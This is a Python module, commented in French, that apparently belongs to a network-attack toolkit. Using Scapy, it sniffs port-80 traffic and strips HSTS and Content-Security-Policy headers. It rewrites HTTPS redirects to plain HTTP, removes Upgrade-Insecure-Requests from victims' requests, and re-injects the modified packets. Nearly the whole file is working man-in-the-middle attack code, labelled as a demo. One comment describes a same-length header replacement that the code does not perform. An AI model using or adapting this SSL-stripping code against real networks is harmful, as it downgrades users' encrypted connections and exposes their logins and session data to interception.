"""
modules/ssl_strip.py
Module de dégradation HTTPS (SSL Stripping).
Intercepte les réponses HTTP du serveur et modifie les headers :
- Location: https://... -> http://...
- Suppression de Strict-Transport-Security (HSTS)
- Suppression de Upgrade-Insecure-Requests
"""
import re
from scapy.all import sniff, send, IP, TCP, Raw
from core.logger import log
from core.config import conf

class SSLStripper:
    def __init__(self):
        self.running = False

    def _process_packet(self, pkt):
        if not pkt.haslayer(Raw): return
        
        try:
            payload = pkt[Raw].load
            new_payload = None
            
            # Sens : Serveur -> Victime (Réponses HTTP)
            # On cherche à retirer les sécurités imposées par le serveur
            if b"HTTP/1.1 200" in payload or b"HTTP/1.1 301" in payload or b"HTTP/1.1 302" in payload:
                
                # 1. Stripping HSTS (La sécurité qui force le HTTPS)
                if b"Strict-Transport-Security" in payload:
                    # On remplace par un header bidon de même longueur pour ne pas casser les SEQ/ACK
                    # "Strict-Transport-Security" (25 chars) -> "X-Stripped-Security-XXXXX"
                    new_payload = re.sub(
                        b"Strict-Transport-Security:.*?\r\n", 
                        b"", 
                        payload, 
                        flags=re.IGNORECASE
                    )
                    
                # 2. Stripping des redirections HTTPS (Location: https://)
                if b"Location: https://" in payload:
                    if new_payload is None: new_payload = payload
                    new_payload = new_payload.replace(b"Location: https://", b"Location: http://")
                
                # 3. Stripping CSP (Content-Security-Policy) qui peut bloquer les scripts
                if b"Content-Security-Policy" in payload:
                    if new_payload is None: new_payload = payload
                    new_payload = re.sub(b"Content-Security-Policy:.*?\r\n", b"", new_payload, flags=re.IGNORECASE)

            # Sens : Victime -> Serveur (Requêtes)
            # On retire "Upgrade-Insecure-Requests" pour ne pas demander le HTTPS
            elif b"GET " in payload or b"POST " in payload:
                if b"Upgrade-Insecure-Requests" in payload:
                    new_payload = re.sub(b"Upgrade-Insecure-Requests:.*?\r\n", b"", payload)

            # SI MODIFICATION : On doit recalculer les checksums et renvoyer
            if new_payload and new_payload != payload:
                pkt[Raw].load = new_payload
                del pkt[IP].len
                del pkt[IP].chksum
                del pkt[TCP].chksum
                
                # Warning: En Python pur avec Scapy, modifier la taille du paquet à la volée 
                # désynchronise les numéros de séquence (SEQ/ACK) TCP suivants.
                # Pour un projet éducatif, on renvoie le paquet modifié, mais sur une longue session
                # cela va casser la connexion. C'est la limite de Scapy vs NFQueue.
                # On envoie quand même pour la démo.
                send(pkt, verbose=False, iface=conf.interface)
                log.raw(f"[cyan]SSL Strip[/cyan]: Paquet modifié ({len(payload)} -> {len(new_payload)} bytes)")
                
                # Note: Dans un vrai outil (Bettercap), on agit comme un proxy TCP complet.
                # Ici, on fait de la manipulation "Best Effort".
                return

        except Exception:
            pass

    def start(self):
        self.running = True
        log.info("SSL Stripping actif (Mode Passif/Réactif).")
        # On filtre le port 80
        sniff(iface=conf.interface, filter="tcp port 80", prn=self._process_packet, store=0)

    def stop(self):
        self.running = False